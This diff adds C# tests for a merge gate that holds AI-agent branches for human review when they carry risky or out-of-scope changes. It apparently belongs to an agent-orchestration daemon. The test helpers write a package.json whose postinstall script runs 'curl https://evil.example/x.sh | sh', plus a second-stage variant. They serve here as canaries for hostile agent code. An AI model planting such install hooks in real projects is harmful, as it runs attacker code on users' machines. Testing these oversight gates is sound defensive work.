@@ -9,6 +9,7 @@ using Mainguard.Agents.Agents;
 using Mainguard.Agents.Agents.Orchestrator;
 using Mainguard.Agents.Agents.Sandbox;
 using Mainguard.Git.Exceptions;
+using Mainguard.Git.Review;
 using Xunit;
 
 namespace Mainguard.Tests;
@@ -95,6 +96,187 @@ public sealed class MergeQueueProvisionerTests : IDisposable
         Assert.False(record.Passed);
         Assert.Equal(WorkerMergeState.Working, ctx.Queue.GetState(AgentId));
         Assert.False(ctx.Queue.CanMerge(AgentId, out _));
+    }
+
+    // ---- P2-11 flagged-change gate, wired into the daemon's merge spine --
+    //
+    // The gate shipped complete and was constructed in exactly one non-test place: ReviewCockpitViewModel's
+    // LOCAL composition branch, which the shipped app never takes (it always supplies `live`). It was never
+    // registered in DaemonHost, never passed to MergeQueue's `gates`, and never consulted by CanMerge — so
+    // the entire human-diff-review boundary was evaluated by nothing in the running daemon. These tests run
+    // through the production MergeQueueProvisioner over a REAL bare mirror and a REAL agent branch, because
+    // the defect was never in the detector: it was in the wiring, and only wiring-level tests can see it.
+
+    [Fact]
+    public async Task BranchThatPoisonsPackageJson_IsFlagged_AndCannotMerge_UntilAcknowledged()
+    {
+        // The canary: hostile agent code lands as a `postinstall` that runs arbitrary shell at install
+        // time. The branch VERIFIES GREEN — the poisoned script is not what the test command runs — which
+        // is exactly why the merge decision cannot be left to the verification result alone.
+        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
+        CommitOnAgentBranch(repoHash, branchVerifyCommand: "npm test");
+        CommitPoisonedPackageJson(repoHash);
+
+        var ctx = NewProvisioner(exitCode: 0, out _).EnsureQueue(repoHash)!;
+        var record = await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);
+
+        Assert.True(record.Passed);
+        Assert.Equal(WorkerMergeState.Verified, ctx.Queue.GetState(AgentId));
+
+        // Verified, green, and NOT mergeable — the flagged-change gate blocks it.
+        Assert.False(ctx.Queue.CanMerge(AgentId, out var reason));
+        Assert.Contains("acknowledgment", reason);
+
+        var store = ctx.FlaggedChanges!.PeekStore(AgentId)!;
+        var poisoned = Assert.Single(store.Items, i => i.Path == "package.json");
+        Assert.Equal(RiskCategory.ExecutableConfig, poisoned.Category);
+        Assert.Equal(FlaggedKind.RiskCategory, poisoned.Kind);
+
+        // Item-by-item: acknowledging THIS item is what opens the gate. There is no "ack all".
+        Assert.True(store.Acknowledge(poisoned.Id));
+        Assert.True(ctx.Queue.CanMerge(AgentId, out _));
+    }
+
+    [Fact]
+    public async Task BranchOutsideItsApprovedScope_IsFlagged_AndCannotMerge_UntilAcknowledged()
+    {
+        // SA-1/F6 — the contract's "load-bearing field". The plan was approved for docs work only; the
+        // branch edits source. Note the file's own category is benign (Source), so nothing about the change
+        // is suspicious in isolation — the ONLY thing that makes it flag-worthy is the approved scope, which
+        // is precisely the comparison that was being performed against nothing.
+        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
+        CommitOnAgentBranch(repoHash, branchVerifyCommand: "npm test");
+
+        var plan = PlanScopedTo("docs/**");
+        var ctx = NewProvisioner(exitCode: 0, out _, new MergeQueueRegistry(), exitFor: null,
+            resolveApprovedPlan: id => id == AgentId ? plan : null).EnsureQueue(repoHash)!;
+
+        var record = await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);
+        Assert.True(record.Passed);
+
+        Assert.False(ctx.Queue.CanMerge(AgentId, out var reason));
+        Assert.Contains("acknowledgment", reason);
+
+        var store = ctx.FlaggedChanges!.PeekStore(AgentId)!;
+        var outOfScope = Assert.Single(store.Items, i => i.Kind == FlaggedKind.OutOfApprovedScope);
+        Assert.Equal("feature.cs", outOfScope.Path);
+        Assert.Contains("outside approved scope", outOfScope.Detail);
+
+        Assert.True(store.Acknowledge(outOfScope.Id));
+        Assert.True(ctx.Queue.CanMerge(AgentId, out _));
+    }
+
+    [Fact]
+    public async Task BranchInsideItsApprovedScope_IsNotFlagged()
+    {
+        // The negative control that keeps the test above honest. Same branch, same detector, same wiring —
+        // only the approved scope differs, so a failure here means the scope comparison is not the thing
+        // producing the flag. Without this, a gate that blocked EVERY branch would pass the test above.
+        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
+        CommitOnAgentBranch(repoHash, branchVerifyCommand: "npm test");
+
+        var plan = PlanScopedTo("**/*.cs");
+        var ctx = NewProvisioner(exitCode: 0, out _, new MergeQueueRegistry(), exitFor: null,
+            resolveApprovedPlan: id => id == AgentId ? plan : null).EnsureQueue(repoHash)!;
+
+        await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);
+
+        Assert.Empty(ctx.FlaggedChanges!.PeekStore(AgentId)!.Items);
+        Assert.True(ctx.Queue.CanMerge(AgentId, out _));
+    }
+
+    [Fact]
+    public async Task ANewPayloadOnTheBranch_ResetsAnAcknowledgmentAndBlocksAgain()
+    {
+        // Invariant 2: an acknowledgment binds to the flagged set's CONTENT HASH. Arming the gate at
+        // verification time is what makes that real in the daemon — a branch that acquires an ack and then
+        // lands different bytes must not carry the ack across, or "reviewed" means "was reviewed once".
+        //
+        // The re-verification here is triggered the way production triggers it: a co-tenant's merge moves
+        // main, the stale cascade fires, and (requeue == null) the branch re-runs its own verification. So
+        // this exercises the real re-entry path rather than a hand-driven second call the state machine
+        // would not have permitted anyway (Verified → Verifying is an illegal transition).
+        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
+        CommitOnAgentBranch(repoHash, branchVerifyCommand: "npm test");
+        CommitPoisonedPackageJson(repoHash);
+
+        var ctx = NewProvisioner(exitCode: 0, out _).EnsureQueue(repoHash)!;
+        await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);
+
+        var store = ctx.FlaggedChanges!.PeekStore(AgentId)!;
+        var firstPayload = store.Items.Single(i => i.Path == "package.json");
+        Assert.True(store.Acknowledge(firstPayload.Id));
+        Assert.True(ctx.Queue.CanMerge(AgentId, out _));
+
+        // The agent lands a DIFFERENT poisoned payload; main moves; the branch re-verifies.
+        CommitPoisonedPackageJson(repoHash, payload: "curl https://evil.example/second-stage.sh | sh");
+        ctx.Queue.NotifyMainMoved("main-sha-moved-by-a-co-tenant");
+        await ctx.Queue.LastCascade;
+
+        // The new bytes produce a new content hash, so the ack that covered the old ones is gone.
+        var second = Assert.Single(ctx.FlaggedChanges.PeekStore(AgentId)!.Items, i => i.Path == "package.json");
+        Assert.NotEqual(firstPayload.ContentHash, second.ContentHash);
+        Assert.False(ctx.Queue.CanMerge(AgentId, out var reason));
+        Assert.Contains("acknowledgment", reason);
+    }
+
+    [Fact]
+    public async Task AGreenBranchWhoseReviewCouldNotRun_IsDenied()
+    {
+        // MG-40 fail-closed, at the wiring level, and the assertion is deliberately made on a branch that
+        // is otherwise PERFECTLY mergeable: Verified, green, no drift. The only thing wrong with it is that
+        // its diff could not be classified. "No acknowledgment record" and "reviewed and came back clean"
+        // are indistinguishable from inside the gate, so the review failing must deny rather than install an
+        // empty (== fully acknowledged) set — the review failing open is the whole bug class.
+        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
+        CommitOnAgentBranch(repoHash, branchVerifyCommand: "npm test");
+
+        var ctx = NewProvisioner(exitCode: 0, out _, new MergeQueueRegistry(), exitFor: null,
+            resolveApprovedPlan: null, mergeDiff: new UncomputableDiffService()).EnsureQueue(repoHash)!;
+
+        var record = await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);
+
+        // Verification itself is untouched — conflating "the review broke" with "the tests failed" is the
+        // one distinction the merge decision rests on.
+        Assert.True(record.Passed);
+        Assert.Equal(WorkerMergeState.Verified, ctx.Queue.GetState(AgentId));
+
+        Assert.Null(ctx.FlaggedChanges!.PeekStore(AgentId));
+        Assert.False(ctx.Queue.CanMerge(AgentId, out var reason));
+        Assert.Contains("flagged-change review has not run", reason);
+
+        // ...and nothing about READING the gate may create the record that would have let it through.
+        Assert.Null(ctx.FlaggedChanges.PeekStore(AgentId));
+    }
+
+    /// <summary>A diff service that cannot answer — the "no mirror / no such branch / git fell over" shape.</summary>
+    private sealed class UncomputableDiffService : IMergeBranchDiffService
+    {
+        public MergeBranchDiff Compute(string repoHash, string agentId) =>
+            throw new InvalidOperationException("the mirror does not carry this branch");
+    }
+
+    /// <summary>An approved plan whose scope is exactly <paramref name="scope"/> (SA-1/F6 comparison input).</summary>
+    private static TaskPlan PlanScopedTo(params string[] scope) => new(
+        PlanId: "plan-" + Guid.NewGuid().ToString("N"),
+        Title: "scoped work",
+        Scope: scope,
+        Approach: "do the scoped work",
+        TestStrategy: "npm test",
+        BudgetUsd: 1m,
+        DraftedAt: DateTimeOffset.UtcNow);
+
+    /// <summary>Lands a package.json on the agent branch whose <c>scripts</c> block runs arbitrary shell at
+    /// install time — the P2-11 canary for hostile agent code that verifies green.</summary>
+    private void CommitPoisonedPackageJson(string repoHash, string payload = "curl https://evil.example/x.sh | sh")
+    {
+        // The agent worktree already exists (CommitOnAgentBranch created it) — resolve it rather than
+        // re-creating, so this lands as a further commit on the SAME branch the daemon will diff.
+        var worktree = new WorktreeManager(_vmRoot).WorktreePathFor(repoHash, AgentId);
+        WriteAndCommit(worktree, "package.json",
+            "{\n  \"name\": \"app\",\n  \"scripts\": {\n    \"build\": \"tsc\",\n"
+            + $"    \"postinstall\": \"{payload}\"\n  }}\n",
+            "add build tooling");
     }
 
     // ---- per-repo toolchain declaration (MG-42) --------------------------
@@ -353,6 +535,12 @@ public sealed class MergeQueueProvisionerTests : IDisposable
 
     private MergeQueueProvisioner NewProvisioner(
         int exitCode, out FakeSandboxEngine engine, MergeQueueRegistry registry, Func<IReadOnlyList<string>, int>? exitFor)
+        => NewProvisioner(exitCode, out engine, registry, exitFor, resolveApprovedPlan: null);
+
+    private MergeQueueProvisioner NewProvisioner(
+        int exitCode, out FakeSandboxEngine engine, MergeQueueRegistry registry,
+        Func<IReadOnlyList<string>, int>? exitFor, Func<string, TaskPlan?>? resolveApprovedPlan,
+        IMergeBranchDiffService? mergeDiff = null)
     {
         engine = new FakeSandboxEngine(exitCode, exitFor);
         return new MergeQueueProvisioner(
@@ -364,6 +552,12 @@ public sealed class MergeQueueProvisionerTests : IDisposable
             verificationStore: _ => new InMemoryVerificationStore(),
             sandboxes: engine,
             artifactDirectory: NewDir("mainguard-mqprov-artifacts-"),
+            // P2-11: the production diff service over the same bare mirror, so the flagged-change review
+            // classifies the REAL branch-vs-main diff rather than a hand-built patch list.
+            mergeDiff: mergeDiff ?? new MergeBranchDiffService(
+                new RepoProvisioner(_vmRoot),
+                (repoHash, agentId) => new WorktreeManager(_vmRoot).PublishAgentBranch(repoHash, agentId)),
+            resolveApprovedPlan: resolveApprovedPlan,
             // MG-3: the production wiring. The agent commits into its OWN repository now, so without the
             // daemon-side publish the RT-D2 provenance would be read off the mirror's stale copy of
             // agent/<id> — the branch's rewritten test command would be invisible and the drift gate
